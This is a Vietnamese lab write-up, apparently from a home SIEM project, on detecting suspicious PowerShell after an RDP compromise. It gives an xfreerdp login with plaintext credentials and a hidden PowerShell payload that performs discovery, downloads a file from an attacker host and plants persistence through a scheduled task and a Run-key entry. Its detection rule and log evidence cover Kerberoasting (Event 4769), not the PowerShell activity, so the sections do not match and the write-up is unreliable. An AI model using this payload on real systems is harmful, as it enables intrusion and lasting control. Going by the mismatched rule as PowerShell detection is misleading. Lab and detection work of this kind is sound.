# Powershell Suspicious Commands

**MITRE ATT&CK:** T1059.001, T1021.001  
**Target:**  Windows Client (192.168.188.40)  

## 1. Attack Scenario

Tiếp nối với kịch bản Brute Force RDP. Thì hiện tại attacker có quyền kiểm soát toàn bộ máy tính của user và hiện tại attacker sẽ muốn duy trì sự hiện diện của mình trên máy hoặc triển khai malware và nhiều thứ khác nữa. Đầu tiên attacker sử dụng lệnh dưới để kết nối đến máy muốn chiếm quyền. 

```bash
xfreerdp /u:alex /p:football /v:192.168.188.40:3389
```

(Dưới đây là đoạn payload mà tôi đã chuẩn bị sẳng)

```
powershell -nop -w hidden -c "
whoami;
hostname;
ipconfig /all;
net user;
net localgroup administrators;
Test-NetConnection 192.168.188.30 -Port 3389;
Invoke-Expression 'Get-Process';
Invoke-WebRequest http://192.168.188.20/test.txt -OutFile C:\Temp\test.txt;
schtasks /create /sc minute /mo 5 /tn 'Updater' /tr 'powershell.exe -ExecutionPolicy Bypass -File C:\Temp\updater.ps1';
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d 'powershell.exe -w hidden -File C:\Temp\updater.ps1' /f;
Start-Process powershell -ArgumentList '-nop -w hidden';
Get-ChildItem C:\Users;
"
```

## 2. Detection Rule (SPL)

```spl
index=* host="DC01" "<EventID>4769</EventID>" 
| rex field=_raw "<Data Name='IpAddress'>::ffff:(?<src_ip>\d+\.\d+\.\d+\.\d+)</Data>"
| rex field=_raw "<Data Name='ServiceName'>(?<service_name>[a-zA-Z0-9._/-]+)</Data>"
| rex field=_raw "<Data Name='TicketEncryptionType'>(?<type>0x[0-9A-Fa-f]+)</Data>"
| stats count by src_ip service_name type
```

## 3. Log Evidence

<img width="1893" height="885" alt="image" src="https://github.com/user-attachments/assets/116ad50c-ff75-4fcf-b4b4-8678ae1f713f" />

Kết quả log cho thấy nhiều Event ID 4769 được sinh ra liên tục từ địa chỉ IP `192.168.188.20`.

Tài khoản `ALEXANDRA_PUGH@SIEM.LAB` đã yêu cầu Kerberos service tickets cho nhiều service accounts như:

- OTIS_FAULKNER
- RON_SCHWARTZ
- MARGO_BOOTH

Điều này cho thấy dấu hiệu SPN enumeration và Kerberoasting activity trong Active Directory environment.\

## 4. Dashboard

Dưới đây là Dashboard của tôi.

<img width="1909" height="757" alt="image" src="https://github.com/user-attachments/assets/69088425-d113-4939-a4ec-30553b05239e" />
